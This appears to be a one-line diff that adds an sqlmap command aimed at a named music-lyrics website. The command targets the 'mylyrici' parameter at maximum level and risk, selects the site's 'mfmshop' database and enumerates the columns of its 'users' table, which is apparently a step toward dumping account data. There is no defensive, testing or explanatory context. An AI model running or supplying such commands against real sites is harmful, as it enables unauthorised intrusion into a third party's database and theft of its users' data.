@@ -1,0 +1,1 @@
+sqlmap -u "https://lyrics.malawi-music.com/single.php?mylyrici=24592&t=sudziwa-ft-quest-prod-jay-mass-ace-tee-beats" --batch --random-agent  --level=5 --risk=3 --threads=10 -D mfmshop  -p mylyrici -T users --columns
